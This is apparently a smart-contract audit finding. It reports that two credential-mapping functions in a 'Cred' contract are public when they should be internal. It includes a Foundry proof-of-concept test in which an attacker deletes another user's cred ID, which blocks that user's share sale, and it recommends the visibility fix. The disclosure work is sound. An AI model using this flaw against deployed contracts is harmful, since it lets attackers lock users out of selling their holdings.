# Vulnerability details

## Impact
The `_removeCredIdPerAddress` and `_addCredIdPerAddress` functions in the Cred contract are declared as public, which allows any external actor to call these functions directly. This poses a significant security risk as these functions are responsible for managing the association between users and their credential IDs.
Besides having The integrity of the credential system compromised, one of the examples of high severity impact is that sellers won't be able to sell all their shares as when someone sells all their shares he's deleted, in `_updateCuratorShareBalance`
```javascript
function _updateCuratorShareBalance(uint256 credId_, address sender_, uint256 amount_, bool isBuy) internal {
        (, uint256 currentNum) = shareBalance[credId_].tryGet(sender_);

        if (isBuy) {
            if (currentNum == 0 && !_credIdExistsPerAddress[sender_][credId_]) {
                _addCredIdPerAddress(credId_, sender_);
                _credIdExistsPerAddress[sender_][credId_] = true;
            }
            shareBalance[credId_].set(sender_, currentNum + amount_);
        } else {
            if ((currentNum - amount_) == 0) {
                _removeCredIdPerAddress(credId_, sender_);
                _credIdExistsPerAddress[sender_][credId_] = false;
            }
            shareBalance[credId_].set(sender_, currentNum - amount_);
        }
    }
```
`_removeCredIdPerAddress` will revert since the credId doesn't exist anymore from `_credIdsPerAddress`

## Proof of Concept
Add an `attacker = makeAddr(("attacker"));` and place the following poc in the Cred.t.sol
```javascript
    function test_SellActionREVERT() public {
        _createCred("BASIC", "SIGNATURE", 0x0);
        _createCred("ADVANCED", "SIGNATURE", 0x0);

        vm.startPrank(anyone);
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 1); // buy shares from cred 1
        uint256 maxPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 2); // buy shares from cred 2

        cred.buyShareCred{ value: buyPrice }(1, 1, maxPrice);
        cred.buyShareCred{ value: buyPrice }(2, 1, maxPrice);

        vm.stopPrank();
        assertEq(cred.isShareHolder(1, anyone), true, "cred 1 is voted by anyone");
        vm.warp(block.timestamp + 10 minutes + 1 seconds);
        uint256 minPrice = bondingCurve.getSellPriceAfterFee(1, 1, 1);
        vm.startPrank(attacker);
        cred._removeCredIdPerAddress(1, anyone); // remove cred 1 from anyone
        vm.stopPrank();
        vm.startPrank(anyone);
        cred.sellShareCred(1, 1, minPrice);
        assertEq(cred.isShareHolder(1, anyone), false, "cred 1 isnt voted by anyone");
    }
```

## Recommended Mitigation Steps
Change the visibility of these functions from `public` to `internal`
```diff
- function _addCredIdPerAddress(uint256 credId_, address sender_) public
+ function _addCredIdPerAddress(uint256 credId_, address sender_) internal {
    // ... function body ...
}
- function _removeCredIdPerAddress(uint256 credId_, address sender_) public
+ function _removeCredIdPerAddress(uint256 credId_, address sender_) internal {
    // ... function body ...
}```
